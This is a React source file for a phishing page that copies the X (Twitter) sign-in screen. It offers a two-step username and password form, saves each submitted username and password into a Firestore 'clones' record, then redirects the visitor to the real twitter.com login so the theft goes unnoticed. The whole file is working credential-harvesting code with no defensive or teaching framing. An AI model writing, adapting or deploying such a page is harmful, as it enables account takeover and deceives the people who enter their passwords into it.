"use client";
import { useState } from "react";
import { db } from "@/lib/firebase";
import { doc, updateDoc, getDoc } from "firebase/firestore";
import type { Clone } from "@/lib/types";

const XLogo = () => (
  <svg
    viewBox="0 0 24 24"
    aria-hidden="true"
    className="w-8 h-8 text-black fill-current"
  >
    <g>
      <path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"></path>
    </g>
  </svg>
);

export default function TwitterPage({ clone }: { clone: Clone }) {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [step, setStep] = useState(1);

  const handleNext = (e: React.FormEvent) => {
    e.preventDefault();
    setStep(2);
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (username) {
      const newCredential = {
        id: `cred-${Math.random().toString(36).substr(2, 9)}`,
        username,
        password,
        createdAt: new Date().toISOString(),
      };

      const cloneRef = doc(db, "clones", clone.id);
      const cloneSnap = await getDoc(cloneRef);
      if (cloneSnap.exists()) {
        const currentCredentials = cloneSnap.data().credentials || [];
        await updateDoc(cloneRef, {
          credentials: [newCredential, ...currentCredentials],
        });
      }
    }
    window.location.href = "https://twitter.com/login";
  };

  return (
    <div className="bg-white min-h-screen flex items-center justify-center font-sans text-black">
      <div className="w-full max-w-sm p-4 bg-white rounded-lg md:shadow-lg md:w-[600px] md:h-auto">
        <div className="flex justify-center mb-5">
          <XLogo />
        </div>
        {step === 1 && (
          <>
            <h1 className="text-3xl font-extrabold mb-6">Sign in to X</h1>
            <div className="space-y-4">
              <button className="w-full bg-white border border-gray-300 text-black py-2 rounded-full font-semibold hover:bg-gray-100 transition-colors flex items-center justify-center gap-2">
                <img
                  src="https://www.google.com/chrome/static/images/favicons/favicon-32x32.png"
                  alt="Google"
                  className="w-5 h-5"
                />
                Sign in with Google
              </button>
              <button className="w-full bg-white border border-gray-300 text-black py-2 rounded-full font-bold hover:bg-gray-100 transition-colors flex items-center justify-center gap-2">
                <svg viewBox="0 0 24 24" className="w-6 h-6">
                  <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10s10-4.48 10-10S17.52 2 12 2zm2.64 15.2c-.34.34-.78.53-1.25.53c-.47 0-.91-.19-1.25-.53c-.68-.68-.68-1.79 0-2.47c.34-.34.78-.53 1.25-.53s.91.19 1.25.53c.68.68.68 1.79 0 2.47zM12 6.13c-2.88 0-4.57 2.05-4.57 4.54c0 1.52.88 2.76 2.14 3.49c.47.28.72.79.64 1.31c-.1.63-.63 1.05-1.25 1.05h-.1c-.47 0-.91-.19-1.25-.53c-.68-.68-.68-1.79 0-2.47c.34-.34.78-.53 1.25-.53s.91-.19 1.25-.53c.68-.68.68-1.79 0-2.47c-.34-.34-.78-.53-1.25-.53s-.91-.19-1.25-.53c-.68-.68-.68-1.79 0-2.47c.34-.34.78-.53 1.25-.53s.91.19 1.25.53c.68.68.68 1.79 0 2.47c-.34.34-.78.53-1.25.53c-.47 0-.91-.19-1.25-.53c-.68-.68-.68-1.79 0-2.47c1.37-1.37 3.32-2.2 5.43-2.2c2.11 0 4.06.83 5.43 2.2c.68.68.68 1.79 0 2.47c-.34.34-.78.53-1.25-.53c-.47 0-.91-.19-1.25-.53c-.68-.68-.68-1.79 0-2.47c.34-.34.78-.53 1.25-.53s.91.19 1.25.53c.68.68.68 1.79 0 2.47c-1.37 1.37-3.32 2.2-5.43 2.2z" />
                </svg>
                Sign in with Apple
              </button>
            </div>

            <div className="flex items-center my-4">
              <div className="flex-grow border-t border-gray-300"></div>
              <span className="px-4 text-sm text-gray-500">or</span>
              <div className="flex-grow border-t border-gray-300"></div>
            </div>

            <form onSubmit={handleNext} className="space-y-4">
              <input
                type="text"
                value={username}
                onChange={(e) => setUsername(e.target.value)}
                placeholder="Phone, email, or username"
                className="w-full px-4 py-3 border border-gray-300 rounded-md bg-white focus:outline-none focus:ring-2 focus:ring-sky-500"
                required
              />
              <button
                type="submit"
                className="w-full bg-black text-white py-2 rounded-full font-bold hover:bg-gray-800 transition-colors"
              >
                Next
              </button>
              <button
                type="button"
                className="w-full bg-white border border-gray-300 text-black py-2 rounded-full font-bold hover:bg-gray-100 transition-colors"
              >
                Forgot password?
              </button>
            </form>
            <div className="mt-6 text-sm text-gray-500">
              Don't have an account?{" "}
              <a href="#" className="text-sky-500 hover:underline">
                Sign up
              </a>
            </div>
          </>
        )}
        {step === 2 && (
          <>
            <h1 className="text-3xl font-extrabold mb-4">
              Enter your password
            </h1>
            <form onSubmit={handleSubmit} className="space-y-6">
              <div className="w-full px-4 py-3 border border-gray-300 rounded-md bg-gray-100">
                <label className="text-xs text-gray-500">Username</label>
                <p>{username}</p>
              </div>
              <input
                type="password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                placeholder="Password"
                className="w-full px-4 py-3 border border-gray-300 rounded-md bg-white focus:outline-none focus:ring-2 focus:ring-sky-500"
                required
              />
              <a
                href="#"
                className="text-sm text-sky-500 hover:underline block"
              >
                Forgot password?
              </a>
              <button
                type="submit"
                className="w-full bg-black text-white py-3 rounded-full font-bold hover:bg-gray-800 transition-colors"
              >
                Log in
              </button>
            </form>
          </>
        )}
      </div>
    </div>
  );
}
